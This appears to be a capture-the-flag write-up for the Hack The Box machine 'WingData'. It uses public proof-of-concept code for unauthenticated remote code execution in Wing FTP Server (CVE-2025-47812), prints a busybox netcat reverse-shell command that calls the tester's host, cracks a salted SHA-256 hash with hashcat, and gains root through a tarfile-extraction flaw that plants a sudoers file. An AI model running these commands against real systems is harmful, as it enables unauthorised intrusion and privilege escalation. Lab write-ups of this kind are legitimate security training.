---
title: WingData
date: 2026-05-31
description: Easy Linux machine running Wing FTP Server 7.4.3 — exploiting CVE-2025-47812 for unauthenticated RCE, cracking a salted SHA-256 hash for a second user, and escalating through an insecure tarfile extraction in a root backup script (CVE-2025-4138).
tags:
  - htb
  - Easy
  - Linux
---

# Initial Recon

```sh
# Nmap 7.95 scan initiated Sat May 30 22:26:18 2026 as: /usr/lib/nmap/nmap -p22,80 -A -oN scan_results.txt 10.129.228.106
Nmap scan report for wingdata.htb (10.129.228.106)
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: WingData Solutions
|_http-server-header: Apache/2.4.66 (Debian)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   266.19 ms 10.10.14.1
2   266.24 ms wingdata.htb (10.129.228.106)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May 30 22:26:55 2026 -- 1 IP address (1 host up) scanned in 37.30 seconds

```

## Subdomain

```text
ftp.wingdata.htb
```

Hosted **Wing FTP Server v7.4.3**.

# User

## Wing FTP RCE

Wing FTP Server 7.4.3 is vulnerable to **CVE-2025-47812** — unauthenticated RCE through session file poisoning:

> CVE: https://github.com/4m3rr0r/CVE-2025-47812-poc

```sh
python3 52347.py -u http://ftp.wingdata.htb/ -c 'busybox nc 10.10.14.42 9001 -e bash'
```

Caught a shell as `wingftp`. The box held two other users: `root` and `wacky`.

## Cracking wacky

User records lived in the FTP server's data directory:

```sh
cat /opt/wftpserver/Data/1/users/wacky.xml
```

Extracted wacky's hash:

```text
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```

Wing FTP salts with `WingFTP` and hashes with SHA-256 — appending the salt makes it hashcat-ready:

```text
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
```

Cracked with `hashcat` mode `1410` (`SHA256($pass.$salt)`):

```sh
hashcat -m 1410 -a 0 hash /usr/share/wordlists/rockyou.txt
```

```text
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP: !#7Blushing^*Bride5
Session.....
...: hashcat
Status...•
. .
Cracked
Hash. Mode.....
1410 (sha256 ($pass. $salt))
Hash. Target...
. .
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503 ….. ingFTP
Time.Started....
:
Sun May 31 00:18:52 2026 (2 secs)

Time.Estimated ... : Sun May 31 00:18:54 2026 (0 secs)

Kernel. Feature ... : Pure Kernel (password length 0-256 bytes)

Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
```

> `wacky : !#7Blushing^*Bride5`

# Root

```text
sudo -l 

(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

The backup restore script runs as root and extracts archives with an insecure `tarfile.extractall()` — letting a crafted tar overwrite `/etc/sudoers`.

> CVE: https://github.com/kyakei/CVE-2025-4138-poc

Build the payload archive:

```sh
python3 exploit.py -o backup_999.tar
```

Transfer it to wacky and run the restore:

```sh
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_999.tar -r restore_test
```

Extraction drops `/etc/sudoers.d/wacky`, granting wacky full root:

```sh
sudo su
```

Gained `root`
